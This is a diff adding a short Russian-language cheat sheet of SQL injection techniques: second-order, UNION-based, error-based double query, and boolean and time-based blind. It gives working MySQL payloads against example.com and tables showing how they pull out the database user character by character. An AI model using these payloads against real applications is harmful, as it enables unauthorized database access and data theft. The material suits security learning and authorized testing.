@@ -1,0 +1,34 @@
+Second order SQL-injection
+admin' #
+
+Union-based. Инъекция в SELECT запросе, вывод данных из БД производится с помощью оператора UNION. Этот метод работает, когда веб-приложение напрямую возвращает результат вывода команды SELECT на страницу (поэтому без разницы, включен вывод ошибок или нет).
+
+http://example.com/?id=9999.9' union select 1,2,3,4,5,6,7 --+
+
+Error-based (double query). Если использовать UNION не получается (нет колонки для вывода или инъекция в UPDATE, INSERT или DELETE), то можно вывести данные из базы искусственно вызывая ошибки.
+
+Например такой запрос:
+SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY MID(user(), FLOOR(RAND(0)*2), 64)
+Вызовет ошибку, в отчете о которой мы увидим данные, которые нам были нужны:
+Duplicate entry 'root@localhost' for key 1
+
+Blind-based (boolean based). Если данные нельзя вывести через union, а ошибки никак не выводятся, то скорее всего мы имеем дело со слепой инъекцией.
+
+Как вы помните, приложение может вернуть либо нормальный результат, либо пустой, либо ошибку. Ошибки в данном случае подавляются. Поэтому мы можем использовать только, что пустой ответ это false, а нормальный ответ - true.
+Параметр/значение 	Результат
+id=1' and Ascii(substring((Select user()),1,1))>97 --+ 	True
+id=1' and Ascii(substring((Select user()),1,1))>120 --+ 	False
+id=1' and Ascii(substring((Select user()),1,1))>110 --+ 	True
+id=1' and Ascii(substring((Select user()),1,1))>115 --+ 	False
+id=1' and Ascii(substring((Select user()),1,1))<113 --+ 	False
+id=1' and Ascii(substring((Select user()),1,1))=114 --+ 	True
+
+Time-based (double blind). А теперь представьте, что SQL-инъекция есть, но результат отдаваемый веб-приложением, не меняется вообще никак. Нельзя как-то выделить, что будет false, а что будет true? Что делать тогда? Использовать временные задержки.
+Параметр/значение 	Результат
+id=1' and if (Ascii(substring((Select user()),1,1))>97, sleep(10),0) --+ 	True 
+id=1' and if (Ascii(substring((Select user()),1,1))>120, sleep(10),0) --+ 	False
+id=1' and if (Ascii(substring((Select user()),1,1))>110, sleep(10),0) --+ 	True 
+id=1' and if (Ascii(substring((Select user()),1,1))>115, sleep(10),0) --+ 	False
+id=1' and if (Ascii(substring((Select user()),1,1))<113, sleep(10),0) --+ 	False
+id=1' and if (Ascii(substring((Select user()),1,1))=114, sleep(10),0) --+ 	True 
+
